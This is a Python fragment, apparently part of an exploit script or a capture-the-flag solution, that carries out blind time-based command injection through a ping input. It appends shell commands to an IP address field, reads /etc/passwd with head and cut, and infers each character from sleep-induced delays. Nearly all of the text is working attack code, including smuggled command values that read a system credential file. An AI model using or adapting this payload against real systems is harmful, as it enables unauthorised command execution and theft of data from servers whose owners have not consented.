extracted = ""

for i in range(min(8, len(known_prefix))):
    # For each position, test common characters
    position = i + 1
    found_char = None
    
    # Test lowercase letters and common special chars
    test_chars = string.ascii_lowercase + string.digits + ":x/"
    
    for char in test_chars:
        # Build regex to match at specific position
        # Use head -1 to get first line, cut to get specific character
        payload = f"127.0.0.1; char=$(head -1 /etc/passwd | cut -c{position}); [ \"$char\" = \"{char}\" ] && sleep 1"
        result = send_ping_with_timing(payload, expected_delay=1)
        
        if result.get('has_delay'):
            found_char = char
            extracted += char
            break
    
    if found_char:
        print(f"Position {position}: '{found_char}' ✓")
    else:
        print(f"Position {position}: ?")
    
    time.sleep(0.3)

